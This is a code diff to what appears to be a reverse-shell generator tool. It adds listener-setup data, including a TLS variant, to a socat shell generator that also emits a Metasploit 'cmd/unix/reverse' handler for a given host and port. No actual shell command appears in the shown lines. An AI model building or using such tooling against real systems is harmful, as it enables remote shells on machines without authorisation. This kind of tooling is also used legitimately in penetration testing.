@@ -1,5 +1,6 @@
 import random
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler
+from dataclasses import replace
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, build_listener_setup
 
 _SHELL_PATHS = ["/bin/bash", "/bin/sh"]
 
@@ -34,6 +35,10 @@ class SocatGenerator(ShellGenerator):
             )
             tty_note = full_pty_note
 
+        ls = build_listener_setup(opts.lhost, opts.lport)
+        if variant == "tls":
+            ls = replace(ls, tls=listener)
+
         return ShellResult(
             command=cmd,
             variant=variant,
@@ -42,6 +47,7 @@ class SocatGenerator(ShellGenerator):
             listener=listener,
             tty_upgrade=tty_note,
             msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
+            listener_setup=ls,
         )
 
     def _pty(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
